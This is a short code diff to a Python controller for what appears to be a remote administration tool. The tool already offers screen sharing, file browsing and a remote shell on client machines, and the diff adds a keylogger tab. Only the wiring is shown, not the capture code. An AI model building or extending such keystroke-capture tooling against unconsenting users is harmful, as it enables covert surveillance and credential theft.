@@ -1,4 +1,5 @@
 import ScreenShare
+from KeyLog.Keylogger import KeyloggerManager
 from NetProtocol import *
 import time
 import threading
@@ -57,6 +58,7 @@ class ClientInspectorController(QObject):
         self.view.pushButton_3.clicked.connect(self.remoteDekstopButtonClicked)
         self.fileExplorerManager = FileExplorerManager(client, self.view)
         self.remoteShellManager = RemoteShellManager(client, self)
+        self.keyloggerManager = KeyloggerManager(client, self.view)
         client.dataLock.acquire_read()
 
         # #start the file explorer thread
@@ -101,6 +103,8 @@ class ClientInspectorController(QObject):
                 self.fileExplorerManager.initializeContents()
         if index == 2: #remote shell tab
             self.remoteShellManager.tab_entered()
+        if index == 3:
+            self.keyloggerManager.tab_entered()
 
     def updateSystemInformation(self):
         self.client.dataLock.acquire_read()
